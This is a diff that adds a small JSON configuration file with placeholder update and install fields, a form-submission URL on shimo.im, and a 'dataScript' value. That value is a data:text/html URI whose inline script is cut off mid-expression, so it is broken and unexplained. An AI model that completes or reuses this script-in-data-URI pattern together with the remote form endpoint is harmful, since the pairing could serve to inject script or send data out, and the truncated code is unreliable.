@@ -1,0 +1,9 @@
+{
+    "Update": "null",
+    "Version": "1.0",
+    "install": "null",
+    "dataScript": "data:text/html;charset=utf-8,<script>document.write(encodeURIComponent(JSON.stringify",
+    "User": {
+        "Subscribe": "https://shimo.im/api/newforms/forms/8Nk6MG22VVUdYjqL/submit"
+    }
+}
